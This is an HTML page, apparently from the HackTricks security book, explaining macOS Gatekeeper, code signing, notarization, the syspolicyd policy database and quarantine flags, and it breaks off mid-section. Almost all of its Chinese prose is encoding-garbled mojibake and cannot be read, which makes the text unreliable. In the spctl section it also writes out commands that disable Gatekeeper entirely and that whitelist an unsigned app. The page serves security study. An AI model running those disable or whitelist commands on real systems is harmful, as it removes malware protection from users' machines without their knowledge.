<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>macOS Gatekeeper / Quarantine / XProtect</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="macos-gatekeeper--quarantine--xprotect"><a class="header" href="#macos-gatekeeper--quarantine--xprotect">macOS Gatekeeper / Quarantine / XProtect</a></h1>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
<p>{% embed url="https://websec.nl/" %}</p>
<h2 id="gatekeeper"><a class="header" href="#gatekeeper">Gatekeeper</a></h2>
<p><strong>Gatekeeper</strong> æ˜¯ä¸º Mac æ“ä½œç³»ç»Ÿå¼€å‘çš„å®‰å…¨åŠŸèƒ½ï¼Œæ—¨åœ¨ç¡®ä¿ç”¨æˆ· <strong>ä»…è¿è¡Œå—ä¿¡ä»»çš„è½¯ä»¶</strong>ã€‚å®ƒé€šè¿‡ <strong>éªŒè¯ç”¨æˆ·ä¸‹è½½å¹¶å°è¯•ä» App Store ä»¥å¤–çš„æ¥æºæ‰“å¼€çš„è½¯ä»¶</strong>ï¼ˆä¾‹å¦‚åº”ç”¨ç¨‹åºã€æ’ä»¶æˆ–å®‰è£…åŒ…ï¼‰æ¥å®ç°ã€‚</p>
<p>Gatekeeper çš„å…³é”®æœºåˆ¶åœ¨äºå…¶ <strong>éªŒè¯</strong> è¿‡ç¨‹ã€‚å®ƒæ£€æŸ¥ä¸‹è½½çš„è½¯ä»¶æ˜¯å¦ <strong>ç”±è®¤å¯çš„å¼€å‘è€…ç­¾å</strong>ï¼Œä»¥ç¡®ä¿è½¯ä»¶çš„çœŸå®æ€§ã€‚æ­¤å¤–ï¼Œå®ƒè¿˜ç¡®è®¤è¯¥è½¯ä»¶æ˜¯å¦ <strong>ç»è¿‡ Apple çš„å…¬è¯</strong>ï¼Œä»¥ç¡®è®¤å…¶ä¸å«å·²çŸ¥çš„æ¶æ„å†…å®¹ï¼Œå¹¶ä¸”åœ¨å…¬è¯åæœªè¢«ç¯¡æ”¹ã€‚</p>
<p>æ­¤å¤–ï¼ŒGatekeeper é€šè¿‡ <strong>æç¤ºç”¨æˆ·é¦–æ¬¡æ‰¹å‡†æ‰“å¼€ä¸‹è½½çš„è½¯ä»¶</strong> æ¥å¢å¼ºç”¨æˆ·æ§åˆ¶å’Œå®‰å…¨æ€§ã€‚æ­¤ä¿æŠ¤æªæ–½æœ‰åŠ©äºé˜²æ­¢ç”¨æˆ·æ— æ„ä¸­è¿è¡Œå¯èƒ½æœ‰å®³çš„å¯æ‰§è¡Œä»£ç ï¼Œè€Œå°†å…¶è¯¯è®¤ä¸ºæ— å®³çš„æ•°æ®æ–‡ä»¶ã€‚</p>
<h3 id="åº”ç”¨ç¨‹åºç­¾å"><a class="header" href="#åº”ç”¨ç¨‹åºç­¾å">åº”ç”¨ç¨‹åºç­¾å</a></h3>
<p>åº”ç”¨ç¨‹åºç­¾åï¼Œä¹Ÿç§°ä¸ºä»£ç ç­¾åï¼Œæ˜¯ Apple å®‰å…¨åŸºç¡€è®¾æ–½çš„å…³é”®ç»„æˆéƒ¨åˆ†ã€‚å®ƒä»¬ç”¨äº <strong>éªŒè¯è½¯ä»¶ä½œè€…çš„èº«ä»½</strong>ï¼ˆå¼€å‘è€…ï¼‰ï¼Œå¹¶ç¡®ä¿è‡ªä¸Šæ¬¡ç­¾åä»¥æ¥ä»£ç æœªè¢«ç¯¡æ”¹ã€‚</p>
<p>å…¶å·¥ä½œåŸç†å¦‚ä¸‹ï¼š</p>
<ol>
<li><strong>ç­¾ååº”ç”¨ç¨‹åºï¼š</strong> å½“å¼€å‘è€…å‡†å¤‡åˆ†å‘å…¶åº”ç”¨ç¨‹åºæ—¶ï¼Œä»–ä»¬ <strong>ä½¿ç”¨ç§é’¥ç­¾ååº”ç”¨ç¨‹åº</strong>ã€‚æ­¤ç§é’¥ä¸ <strong>Apple åœ¨å¼€å‘è€…æ³¨å†Œ Apple Developer Program æ—¶å‘å¼€å‘è€…é¢å‘çš„è¯ä¹¦</strong> ç›¸å…³è”ã€‚ç­¾åè¿‡ç¨‹æ¶‰åŠåˆ›å»ºåº”ç”¨ç¨‹åºæ‰€æœ‰éƒ¨åˆ†çš„åŠ å¯†å“ˆå¸Œï¼Œå¹¶ä½¿ç”¨å¼€å‘è€…çš„ç§é’¥åŠ å¯†è¯¥å“ˆå¸Œã€‚</li>
<li><strong>åˆ†å‘åº”ç”¨ç¨‹åºï¼š</strong> ç­¾åçš„åº”ç”¨ç¨‹åºéšåä¸å¼€å‘è€…çš„è¯ä¹¦ä¸€èµ·åˆ†å‘ï¼Œè¯¥è¯ä¹¦åŒ…å«ç›¸åº”çš„å…¬é’¥ã€‚</li>
<li><strong>éªŒè¯åº”ç”¨ç¨‹åºï¼š</strong> å½“ç”¨æˆ·ä¸‹è½½å¹¶å°è¯•è¿è¡Œåº”ç”¨ç¨‹åºæ—¶ï¼Œä»–ä»¬çš„ Mac æ“ä½œç³»ç»Ÿä½¿ç”¨å¼€å‘è€…è¯ä¹¦ä¸­çš„å…¬é’¥è§£å¯†å“ˆå¸Œã€‚ç„¶åï¼Œå®ƒæ ¹æ®åº”ç”¨ç¨‹åºçš„å½“å‰çŠ¶æ€é‡æ–°è®¡ç®—å“ˆå¸Œï¼Œå¹¶å°†å…¶ä¸è§£å¯†åçš„å“ˆå¸Œè¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœå®ƒä»¬åŒ¹é…ï¼Œåˆ™æ„å‘³ç€ <strong>è‡ªå¼€å‘è€…ç­¾åä»¥æ¥ï¼Œåº”ç”¨ç¨‹åºæœªè¢«ä¿®æ”¹</strong>ï¼Œç³»ç»Ÿå…è®¸è¯¥åº”ç”¨ç¨‹åºè¿è¡Œã€‚</li>
</ol>
<p>åº”ç”¨ç¨‹åºç­¾åæ˜¯ Apple Gatekeeper æŠ€æœ¯çš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚å½“ç”¨æˆ·å°è¯• <strong>æ‰“å¼€ä»äº’è”ç½‘ä¸‹è½½çš„åº”ç”¨ç¨‹åº</strong> æ—¶ï¼ŒGatekeeper ä¼šéªŒè¯åº”ç”¨ç¨‹åºç­¾åã€‚å¦‚æœå®ƒæ˜¯ç”± Apple å‘å·²çŸ¥å¼€å‘è€…é¢å‘çš„è¯ä¹¦ç­¾åï¼Œå¹¶ä¸”ä»£ç æœªè¢«ç¯¡æ”¹ï¼ŒGatekeeper å…è®¸è¯¥åº”ç”¨ç¨‹åºè¿è¡Œã€‚å¦åˆ™ï¼Œå®ƒä¼šé˜»æ­¢è¯¥åº”ç”¨ç¨‹åºå¹¶æé†’ç”¨æˆ·ã€‚</p>
<p>ä» macOS Catalina å¼€å§‹ï¼Œ<strong>Gatekeeper è¿˜æ£€æŸ¥åº”ç”¨ç¨‹åºæ˜¯å¦ç»è¿‡ Apple çš„å…¬è¯</strong>ï¼Œå¢åŠ äº†ä¸€å±‚é¢å¤–çš„å®‰å…¨æ€§ã€‚å…¬è¯è¿‡ç¨‹æ£€æŸ¥åº”ç”¨ç¨‹åºæ˜¯å¦å­˜åœ¨å·²çŸ¥çš„å®‰å…¨é—®é¢˜å’Œæ¶æ„ä»£ç ï¼Œå¦‚æœè¿™äº›æ£€æŸ¥é€šè¿‡ï¼ŒApple ä¼šå‘åº”ç”¨ç¨‹åºæ·»åŠ ä¸€ä¸ª Gatekeeper å¯ä»¥éªŒè¯çš„ç¥¨æ®ã€‚</p>
<h4 id="æ£€æŸ¥ç­¾å"><a class="header" href="#æ£€æŸ¥ç­¾å">æ£€æŸ¥ç­¾å</a></h4>
<p>åœ¨æ£€æŸ¥æŸäº› <strong>æ¶æ„è½¯ä»¶æ ·æœ¬</strong> æ—¶ï¼Œæ‚¨åº”å§‹ç»ˆ <strong>æ£€æŸ¥äºŒè¿›åˆ¶æ–‡ä»¶çš„ç­¾å</strong>ï¼Œå› ä¸º <strong>ç­¾å</strong> çš„å¼€å‘è€…å¯èƒ½å·²ç» <strong>ä¸æ¶æ„è½¯ä»¶ç›¸å…³</strong>ã€‚</p>
<pre><code class="language-bash"># Get signer
codesign -vv -d /bin/ls 2&gt;&amp;1 | grep -E "Authority|TeamIdentifier"

# Check if the appâ€™s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s &lt;cert-name-keychain&gt; toolsdemo
</code></pre>
<h3 id="notarization"><a class="header" href="#notarization">Notarization</a></h3>
<p>è‹¹æœçš„ notarization è¿‡ç¨‹ä½œä¸ºé¢å¤–çš„ä¿æŠ¤æªæ–½ï¼Œæ—¨åœ¨ä¿æŠ¤ç”¨æˆ·å…å—æ½œåœ¨æœ‰å®³è½¯ä»¶çš„å½±å“ã€‚å®ƒæ¶‰åŠ <strong>å¼€å‘è€…æäº¤ä»–ä»¬çš„åº”ç”¨ç¨‹åºè¿›è¡Œå®¡æŸ¥</strong>ï¼Œç”± <strong>è‹¹æœçš„ Notary Service</strong> è¿›è¡Œï¼Œè¿™ä¸åº”ç”¨å®¡æ ¸ä¸åº”æ··æ·†ã€‚è¯¥æœåŠ¡æ˜¯ä¸€ä¸ª <strong>è‡ªåŠ¨åŒ–ç³»ç»Ÿ</strong>ï¼Œå¯¹æäº¤çš„è½¯ä»¶è¿›è¡Œå®¡æŸ¥ï¼Œä»¥æ£€æŸ¥æ˜¯å¦å­˜åœ¨ <strong>æ¶æ„å†…å®¹</strong> å’Œä»»ä½•æ½œåœ¨çš„ä»£ç ç­¾åé—®é¢˜ã€‚</p>
<p>å¦‚æœè½¯ä»¶ <strong>é€šè¿‡</strong> äº†è¿™æ¬¡æ£€æŸ¥è€Œæ²¡æœ‰å¼•å‘ä»»ä½•é—®é¢˜ï¼ŒNotary Service ä¼šç”Ÿæˆä¸€ä¸ª notarization ç¥¨æ®ã€‚å¼€å‘è€…éšåéœ€è¦ <strong>å°†æ­¤ç¥¨æ®é™„åŠ åˆ°ä»–ä»¬çš„è½¯ä»¶ä¸Š</strong>ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºâ€œstaplingâ€ã€‚æ­¤å¤–ï¼Œnotarization ç¥¨æ®ä¹Ÿä¼šåœ¨çº¿å‘å¸ƒï¼ŒGatekeeperï¼Œè‹¹æœçš„å®‰å…¨æŠ€æœ¯ï¼Œå¯ä»¥è®¿é—®å®ƒã€‚</p>
<p>åœ¨ç”¨æˆ·é¦–æ¬¡å®‰è£…æˆ–æ‰§è¡Œè½¯ä»¶æ—¶ï¼Œnotarization ç¥¨æ®çš„å­˜åœ¨ - æ— è®ºæ˜¯é™„åŠ åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸Šè¿˜æ˜¯åœ¨çº¿æ‰¾åˆ° - <strong>é€šçŸ¥ Gatekeeper è¯¥è½¯ä»¶å·²ç”±è‹¹æœè¿›è¡Œ notarization</strong>ã€‚å› æ­¤ï¼ŒGatekeeper åœ¨åˆå§‹å¯åŠ¨å¯¹è¯æ¡†ä¸­æ˜¾ç¤ºä¸€æ¡æè¿°æ€§æ¶ˆæ¯ï¼Œè¡¨æ˜è¯¥è½¯ä»¶å·²é€šè¿‡è‹¹æœçš„æ¶æ„å†…å®¹æ£€æŸ¥ã€‚è¿™ä¸ªè¿‡ç¨‹å¢å¼ºäº†ç”¨æˆ·å¯¹ä»–ä»¬åœ¨ç³»ç»Ÿä¸Šå®‰è£…æˆ–è¿è¡Œçš„è½¯ä»¶å®‰å…¨æ€§çš„ä¿¡å¿ƒã€‚</p>
<h3 id="spctl--syspolicyd"><a class="header" href="#spctl--syspolicyd">spctl &amp; syspolicyd</a></h3>
<p>{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œä» Sequoia ç‰ˆæœ¬å¼€å§‹ï¼Œ<strong><code>spctl</code></strong> ä¸å†å…è®¸ä¿®æ”¹ Gatekeeper é…ç½®ã€‚
{% endhint %}</p>
<p><strong><code>spctl</code></strong> æ˜¯ç”¨äºæšä¸¾å’Œä¸ Gatekeeper äº¤äº’çš„ CLI å·¥å…·ï¼ˆé€šè¿‡ XPC æ¶ˆæ¯ä¸ <code>syspolicyd</code> å®ˆæŠ¤è¿›ç¨‹äº¤äº’ï¼‰ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ GateKeeper çš„ <strong>çŠ¶æ€</strong>ï¼š</p>
<pre><code class="language-bash"># Check the status
spctl --status
</code></pre>
<p>{% hint style="danger" %}
è¯·æ³¨æ„ï¼ŒGateKeeper ç­¾åæ£€æŸ¥ä»…å¯¹ <strong>å…·æœ‰éš”ç¦»å±æ€§çš„æ–‡ä»¶</strong> æ‰§è¡Œï¼Œè€Œä¸æ˜¯å¯¹æ¯ä¸ªæ–‡ä»¶ã€‚
{% endhint %}</p>
<p>GateKeeper å°†æ ¹æ® <strong>é¦–é€‰é¡¹å’Œç­¾å</strong> æ£€æŸ¥äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯å¦å¯ä»¥æ‰§è¡Œï¼š</p>
<figure><img src="../../../.gitbook/assets/image (1150).png" alt=""><figcaption></figcaption></figure>
<p><strong><code>syspolicyd</code></strong> æ˜¯è´Ÿè´£æ‰§è¡Œ Gatekeeper çš„ä¸»è¦å®ˆæŠ¤è¿›ç¨‹ã€‚å®ƒç»´æŠ¤ä¸€ä¸ªä½äº <code>/var/db/SystemPolicy</code> çš„æ•°æ®åº“ï¼Œå¯ä»¥åœ¨ <a href="https://opensource.apple.com/source/Security/Security-58286.240.4/OSX/libsecurity_codesigning/lib/policydb.cpp">è¿™é‡Œæ‰¾åˆ°æ”¯æŒè¯¥æ•°æ®åº“çš„ä»£ç </a> å’Œ <a href="https://opensource.apple.com/source/Security/Security-58286.240.4/OSX/libsecurity_codesigning/lib/syspolicy.sql">è¿™é‡Œæ‰¾åˆ° SQL æ¨¡æ¿</a>ã€‚è¯·æ³¨æ„ï¼Œè¯¥æ•°æ®åº“ä¸å— SIP é™åˆ¶ï¼Œå¹¶ä¸”å¯ä»¥ç”± root å†™å…¥ï¼Œæ•°æ®åº“ <code>/var/db/.SystemPolicy-default</code> ç”¨ä½œåŸå§‹å¤‡ä»½ï¼Œä»¥é˜²å…¶ä»–æ•°æ®åº“æŸåã€‚</p>
<p>æ­¤å¤–ï¼Œ<strong><code>/var/db/gke.bundle</code></strong> å’Œ <strong><code>/var/db/gkopaque.bundle</code></strong> åŒ…å«æ’å…¥æ•°æ®åº“çš„è§„åˆ™æ–‡ä»¶ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ root æƒé™æ£€æŸ¥æ­¤æ•°æ®åº“ï¼š</p>
<pre><code class="language-bash"># Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
</code></pre>
<p><strong><code>syspolicyd</code></strong> è¿˜æš´éœ²äº†ä¸€ä¸ª XPC æœåŠ¡å™¨ï¼Œå…·æœ‰ä¸åŒçš„æ“ä½œï¼Œå¦‚ <code>assess</code>ã€<code>update</code>ã€<code>record</code> å’Œ <code>cancel</code>ï¼Œè¿™äº›æ“ä½œä¹Ÿå¯ä»¥é€šè¿‡ <strong><code>Security.framework</code> çš„ <code>SecAssessment*</code></strong> API è®¿é—®ï¼Œè€Œ <strong><code>xpctl</code></strong> å®é™…ä¸Šé€šè¿‡ XPC ä¸ <strong><code>syspolicyd</code></strong> è¿›è¡Œé€šä¿¡ã€‚</p>
<p>æ³¨æ„ç¬¬ä¸€ä¸ªè§„åˆ™ä»¥ "<strong>App Store</strong>" ç»“æŸï¼Œç¬¬äºŒä¸ªè§„åˆ™ä»¥ "<strong>Developer ID</strong>" ç»“æŸï¼Œå¹¶ä¸”åœ¨ä¹‹å‰çš„å›¾åƒä¸­ï¼Œå®ƒæ˜¯ <strong>å¯ç”¨ä» App Store å’Œå·²è¯†åˆ«å¼€å‘è€…æ‰§è¡Œåº”ç”¨ç¨‹åº</strong>ã€‚<br />
å¦‚æœæ‚¨ <strong>ä¿®æ”¹</strong> è¯¥è®¾ç½®ä¸º App Storeï¼Œ"<strong>Notarized Developer ID" è§„åˆ™å°†æ¶ˆå¤±</strong>ã€‚</p>
<p>è¿˜æœ‰æˆåƒä¸Šä¸‡çš„ <strong>ç±»å‹ GKE</strong> çš„è§„åˆ™ï¼š</p>
<pre><code class="language-bash">SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
</code></pre>
<p>è¿™äº›æ˜¯æ¥è‡ªä»¥ä¸‹ä½ç½®çš„å“ˆå¸Œï¼š</p>
<ul>
<li><code>/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth</code></li>
<li><code>/var/db/gke.bundle/Contents/Resources/gk.db</code></li>
<li><code>/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db</code></li>
</ul>
<p>æˆ–è€…ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ—å‡ºä¹‹å‰çš„ä¿¡æ¯ï¼š</p>
<pre><code class="language-bash">sudo spctl --list
</code></pre>
<p>é€‰é¡¹ <strong><code>--master-disable</code></strong> å’Œ <strong><code>--global-disable</code></strong> çš„ <strong><code>spctl</code></strong> å°†å®Œå…¨ <strong>ç¦ç”¨</strong> è¿™äº›ç­¾åæ£€æŸ¥ï¼š</p>
<pre><code class="language-bash"># Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
</code></pre>
<p>å½“å®Œå…¨å¯ç”¨æ—¶ï¼Œå°†å‡ºç°ä¸€ä¸ªæ–°é€‰é¡¹ï¼š</p>
<figure><img src="../../../.gitbook/assets/image (1151).png" alt=""><figcaption></figcaption></figure>
<p>å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼<strong>æ£€æŸ¥ä¸€ä¸ªåº”ç”¨æ˜¯å¦ä¼šè¢«GateKeeperå…è®¸</strong>ï¼š</p>
<pre><code class="language-bash">spctl --assess -v /Applications/App.app
</code></pre>
<p>å¯ä»¥åœ¨GateKeeperä¸­æ·»åŠ æ–°è§„åˆ™ï¼Œä»¥å…è®¸æŸäº›åº”ç”¨ç¨‹åºçš„æ‰§è¡Œï¼š</p>
<pre><code class="language-bash"># Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
</code></pre>
<p>å…³äº <strong>å†…æ ¸æ‰©å±•</strong>ï¼Œæ–‡ä»¶å¤¹ <code>/var/db/SystemPolicyConfiguration</code> åŒ…å«å…è®¸åŠ è½½çš„ kext åˆ—è¡¨æ–‡ä»¶ã€‚æ­¤å¤–ï¼Œ<code>spctl</code> æ‹¥æœ‰ <code>com.apple.private.iokit.nvram-csr</code> æƒé™ï¼Œå› ä¸ºå®ƒèƒ½å¤Ÿæ·»åŠ éœ€è¦åœ¨ NVRAM ä¸­ä»¥ <code>kext-allowed-teams</code> é”®ä¿å­˜çš„æ–°é¢„å…ˆæ‰¹å‡†çš„å†…æ ¸æ‰©å±•ã€‚</p>
<h3 id="éš”ç¦»æ–‡ä»¶"><a class="header" href="#éš”ç¦»æ–‡ä»¶">éš”ç¦»æ–‡ä»¶</a></h3>
<p>åœ¨ <strong>ä¸‹è½½</strong> åº”ç”¨ç¨‹åºæˆ–æ–‡ä»¶æ—¶ï¼Œç‰¹å®šçš„ macOS <strong>åº”ç”¨ç¨‹åº</strong>ï¼ˆå¦‚ç½‘é¡µæµè§ˆå™¨æˆ–ç”µå­é‚®ä»¶å®¢æˆ·ç«¯ï¼‰ä¼šå°†ä¸€ä¸ªæ‰©å±•æ–‡ä»¶å±æ€§ï¼Œé€šå¸¸ç§°ä¸º "<strong>éš”ç¦»æ ‡å¿—</strong>"ï¼Œé™„åŠ åˆ°ä¸‹è½½çš„æ–‡ä»¶ä¸Šã€‚æ­¤å±æ€§ä½œä¸ºå®‰å…¨æªæ–½ï¼Œ<strong>æ ‡è®°æ–‡ä»¶</strong> æ¥è‡ªä¸å—ä¿¡ä»»çš„æ¥æºï¼ˆäº’è”ç½‘ï¼‰ï¼Œå¹¶å¯èƒ½å¸¦æ¥é£é™©ã€‚ç„¶è€Œï¼Œå¹¶éæ‰€æœ‰åº”ç”¨ç¨‹åºéƒ½ä¼šé™„åŠ æ­¤å±æ€§ï¼Œä¾‹å¦‚ï¼Œå¸¸è§çš„ BitTorrent å®¢æˆ·ç«¯è½¯ä»¶é€šå¸¸ä¼šç»•è¿‡æ­¤è¿‡ç¨‹ã€‚</p>
<p><strong>éš”ç¦»æ ‡å¿—çš„å­˜åœ¨åœ¨ç”¨æˆ·å°è¯•æ‰§è¡Œæ–‡ä»¶æ—¶å‘ macOS çš„ Gatekeeper å®‰å…¨åŠŸèƒ½å‘å‡ºä¿¡å·</strong>ã€‚</p>
<p>åœ¨ <strong>éš”ç¦»æ ‡å¿—ä¸å­˜åœ¨</strong> çš„æƒ…å†µä¸‹ï¼ˆä¾‹å¦‚é€šè¿‡æŸäº› BitTorrent å®¢æˆ·ç«¯ä¸‹è½½çš„æ–‡ä»¶ï¼‰ï¼ŒGatekeeper çš„ <strong>æ£€æŸ¥å¯èƒ½ä¸ä¼šæ‰§è¡Œ</strong>ã€‚å› æ­¤ï¼Œç”¨æˆ·åœ¨æ‰“å¼€æ¥è‡ªä¸å¤ªå®‰å…¨æˆ–æœªçŸ¥æ¥æºçš„æ–‡ä»¶æ—¶åº”è°¨æ…ã€‚</p>
<p>{% hint style="info" %}
